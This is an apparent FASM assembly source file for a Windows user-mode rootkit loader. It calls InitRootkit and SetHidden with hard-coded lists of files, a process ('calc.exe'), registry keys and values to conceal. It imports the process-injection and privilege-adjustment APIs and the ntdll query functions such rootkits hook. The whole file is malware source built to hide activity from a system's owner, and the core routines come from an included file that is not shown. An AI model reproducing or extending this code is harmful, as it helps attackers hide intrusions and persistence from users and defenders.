format PE GUI 4.0

include 'win32a.inc'

section '.text' code readable writeable executable

include 'micrork.inc'

HiddenFiles	 db '_;hdfile;tp7;BKY;', 0
HiddenProcesses  db 'calc.exe', 0
HiddenRegKeys	 db 'bo;hrt;', 0
HiddenRegValues  db 'group;', 0
TrueProcesses	 db 'tproc;prv;', 0

entry $
  call	  InitRootkit
  push	  TrueProcesses
  push	  HiddenRegValues
  push	  HiddenRegKeys
  push	  HiddenProcesses
  push	  HiddenFiles
  call	  SetHidden
  ret


section '.idata' import data readable writeable

  library kernel32, 'kernel32.dll',\
	  advapi32, 'advapi32.dll',\
	  ntdll,    'ntdll.dll'

  import kernel32,					     \
       VirtualAllocEx,		 'VirtualAllocEx',	     \
       DuplicateHandle, 	 'DuplicateHandle',	     \
       WriteProcessMemory,	 'WriteProcessMemory',	     \
       CreateRemoteThread,	 'CreateRemoteThread',	     \
       CreateToolhelp32Snapshot, 'CreateToolhelp32Snapshot', \
       Process32First,		 'Process32First',	     \
       Process32Next,		 'Process32Next',	     \
       OpenProcess,		 'OpenProcess', 	     \
       CloseHandle,		 'CloseHandle', 	     \
       VirtualProtect,		 'VirtualProtect',	     \
       MapViewOfFile,		 'MapViewOfFile',	     \
       ReadProcessMemory,	 'ReadProcessMemory',	     \
       GetModuleFileNameW,	 'GetModuleFileNameW',	     \
       CreateFileMapping,	 'CreateFileMappingA'

  import advapi32,					     \
       OpenProcessToken,	 'OpenProcessToken',	     \
       LookupPrivilegeValue,	 'LookupPrivilegeValueA',    \
       AdjustTokenPrivileges,	 'AdjustTokenPrivileges'

  import ntdll, 					     \
       ZwQueryDirectoryFile,	 'ZwQueryDirectoryFile',     \
       wcsnicmp,		 '_wcsnicmp',		     \
       wcscpy,			 'wcscpy',		     \
       ZwQuerySystemInformation, 'ZwQuerySystemInformation', \
       ZwEnumerateValueKey,	 'ZwEnumerateValueKey',      \
       wcsncpy, 		 'wcsncpy',		     \
       ZwClose, 		 'ZwClose',		     \
       ZwOpenKey,		 'ZwOpenKey',		     \
       ZwEnumerateKey,		 'ZwEnumerateKey',	     \
       RtlInitUnicodeString,	 'RtlInitUnicodeString',     \
       wcsicmp, 		 '_wcsicmp',		     \
       mbstowcs,		 'mbstowcs',		     \
       ZwCreateThread,		 'ZwCreateThread'
